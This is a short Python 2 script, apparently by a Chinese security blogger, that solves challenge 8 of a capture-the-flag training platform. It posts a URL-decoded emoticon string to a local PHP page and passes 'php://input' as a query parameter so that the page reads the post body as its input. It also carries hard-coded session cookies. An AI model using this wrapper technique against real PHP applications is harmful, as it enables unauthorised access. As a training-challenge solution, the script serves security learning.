#!/usr/bin/env python
# -*- coding: utf_8 -*-
# Date: 2014/11/26
# Created by 独自等待
# 博客 http://www.waitalone.cn/
import urllib
try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')

try:
    print '\n网络信息安全攻防学习平台脚本关第8题\n'
    s = requests.Session()
    url = 'http://127.0.0.1/rumRaisin/challenge/smile/smile.php?^.^=php://input'
    header = {'Cookie':'saeut=218.108.135.246.1416190347811282; PHPSESSID=5f3d9f5685452d1474f59371067e36af'}
    r = s.post(url, data=urllib.unquote("%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29"), headers=header)
    print r.content
except KeyboardInterrupt:
    raise SystemExit('大爷,按您的吩咐,已成功退出！')

